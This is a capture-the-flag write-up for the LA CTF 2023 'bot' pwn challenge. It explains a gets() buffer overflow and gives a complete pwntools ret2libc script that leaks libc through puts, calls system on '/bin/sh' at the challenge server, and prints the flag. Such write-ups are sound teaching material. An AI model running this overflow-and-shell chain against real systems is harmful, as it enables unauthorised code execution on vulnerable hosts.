# bot

[Problem](https://github.com/uclaacm/lactf-archive/tree/master/2023/pwn/bot)

This problem confuses me a little bit. We got the source code, ELF file, and a libc. The source code is the following:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
  setbuf(stdout, NULL);
  char input[64];
  volatile int give_flag = 0;
  puts("hi, how can i help?");
  gets(input);
  if (strcmp(input, "give me the flag") == 0) {
    puts("lol no");
  } else if (strcmp(input, "please give me the flag") == 0) {
    puts("no");
  } else if (strcmp(input, "help, i have no idea how to solve this") == 0) {
    puts("L");
  } else if (strcmp(input, "may i have the flag?") == 0) {
    puts("not with that attitude");
  } else if (strcmp(input, "please please please give me the flag") == 0) {
    puts("i'll consider it");
    sleep(15);
    if (give_flag) {
      puts("ok here's your flag");
      system("cat flag.txt");
    } else {
      puts("no");
    }
  } else {
    puts("sorry, i didn't understand your question");
    exit(1);
  }
}
```

There is a vulnerable function gets, which allows us to overflow the buffer "input".Then we open the ELF file with IDA.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char input[64]; // [rsp+10h] [rbp-40h] BYREF
    //rbp-40h is the distance between "input" and rbp. Note that the "40h" is 0x40.But we don't want to just overflow to rbp; we want to control the return address, so we add 8 (the length of rbp) to reach the return address.
  setbuf(_bss_start, 0LL);
  puts("hi, how can i help?");
  gets(input);
  if ( !strcmp(input, "give me the flag") )
  {
    puts("lol no");
  }
  else if ( !strcmp(input, "please give me the flag") )
  {
    puts("no");
  }
  else if ( !strcmp(input, "help, i have no idea how to solve this") )
  {
    puts("L");
  }
  else if ( !strcmp(input, "may i have the flag?") )
  {
    puts("not with that attitude");
  }
  else
  {
    if ( strcmp(input, "please please please give me the flag") )
    {
      puts("sorry, i didn't understand your question");
      exit(1);
    }
    puts("i'll consider it");
    sleep(0xFu);
    puts("no");
  }
  return 0;
}
```

We can see that it's different with the source code; it doesn't have the variable "give_flag".It's not a big problem, we can still use the technique "Ret2Libc".

```python
from pwn import *
context.log_level='debug'
#p=process("bot")
p=remote("lac.tf",31180)
puts_plt=0x401030
puts_got=0x404018 #Puts_got and puts_plt can be found in IDA.
rdi=0x000000000040133b #"pop rdi ; ret"
main=0x401182
payload=b'give me the flag\x00'.ljust(0x40+8,b'a')+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main) #The padding needs to have a length of 0x48, which is the distance between "input" and the return address.I put b'give me the flag\x00' in the front, so it won't trigger sleep function and waste time.By the way, the strcmp function only compares two strings until '\x00',so it doesn't matter what we put behind '\x00'.
p.sendlineafter("hi, how can i help?",payload)
puts_addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
base=puts_addr-472560 #This offset can be found in the libc file that is given to us, using "libc.symbols['puts']".
system=0x401050
binsh=base+1663314
payload=b'give me the flag\x00'.ljust(0x40+8,b'a')+p64(rdi)+p64(binsh)+p64(system)+p64(main)
p.sendlineafter("hi, how can i help?",payload)
p.interactive()
```

That's how every normal "Ret2Libc" ropchain works. First, we put a padding to fill the buffer and overflow it to the return address.The "p64(rdi)" is now the return address; it will pop the following value "p64(puts_got)" into the rdi register, which is the first parameter of the next calling function. Then we call puts, it will leak the real address of puts. Figure out the base address of the file with some small calculations, and we can finally call the system function to get shell.

For more information of leaking libc address, go to [here](https://book.hacktricks.xyz/reversing-and-exploiting/linux-exploiting-basic-esp/rop-leaking-libc-address).

## Flag
> lactf{hey_stop_bullying_my_bot_thats_not_nice}